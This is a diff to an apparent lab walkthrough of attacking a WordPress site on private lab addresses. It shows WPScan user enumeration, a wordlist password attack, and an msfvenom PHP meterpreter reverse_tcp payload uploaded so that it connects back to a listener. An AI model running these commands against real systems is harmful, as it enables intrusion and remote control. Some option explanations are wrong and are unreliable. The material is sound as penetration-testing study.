@@ -18,6 +18,10 @@ In order to upload the file to the server, we use the $`curl` command. $` curl h
 Before we use the WPScan, we need to update the db. After the update we do $`wpscan --url http://10.0.2.8:8585/wordpress -e(enumerate) vp(verbose), u(username)` This will do the scanning, under interesting findings it will have things that we can look for. It will also show users identified and if possible will get the passwords. 
 We can now try to get the passwords by adding a dictionary password file. $`wpscan --url http://10.0.2.8:8585/wordpress --passwords /usr/share/wordlists/metasploit/password.lst` It will try to find the password using the values in the password file. You as an attacker will have to play around and see if you can add a different file to find the right password. It did not find any passwords, this is a tedious process so we might have to try different things in order to make sure we get the right. 
 
+
+$`Now we will try a different method in order to get to the system using MSFVenom`
+
+
 Now that we know that we can upload a file, we will be using msfvenom in order to get a meterpreter session. We will open a new terminal and first search for a `reverse_tcp`. We will type in $`msfvenom --list payloads | grep php` the grep command will look for payloads which have php on it. When we find it we will type $`msfvenom --payload php/meterpreter/reverse_tcp lhost=10.0.2.15 lport=4444 > free.php` this is create a payload and save it as `free.php` We will need to upload this `free.php` to the uploads folder so that when somebody clicks on it, then it will connect back to our listener. 
 
 After this we will go back to the msfconsole, $`msf6 > use exploit/multi/handler`. Here we are setting up the listener. We want the user to connect back to me. After this we do options so as to see what parameters we need to set in order to use the exploit. We have to set the $`Rhost` and $`Rport` and we need to add the $`payload options` we will type in set payload options `php/meterpreter/reverse_tcp`. 
